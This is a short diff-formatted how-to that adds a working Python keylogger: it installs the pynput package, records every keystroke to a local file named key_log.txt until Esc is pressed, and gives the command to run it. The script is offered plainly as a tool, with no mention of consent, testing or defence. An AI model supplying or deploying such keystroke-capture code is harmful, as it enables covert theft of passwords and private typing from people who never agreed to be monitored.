@@ -1,0 +1,29 @@
+##Install the pynput package##
+pip install pynput
+
+##Write the Python script##
+from pynput import keyboard
+
+# Function to handle key press events
+def on_press(key):
+    try:
+        with open("key_log.txt", "a") as file:
+            # If the key is a character, write it directly
+            file.write(f"{key.char}")
+    except AttributeError:
+        # Handle special keys (e.g., space, enter, etc.)
+        with open("key_log.txt", "a") as file:
+            file.write(f" [{key}] ")
+
+# Function to handle key release events
+def on_release(key):
+    # Stop recording if the 'Esc' key is pressed
+    if key == keyboard.Key.esc:
+        return False
+
+# Setting up the listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+##Run the Script##
+python your_script_name.py
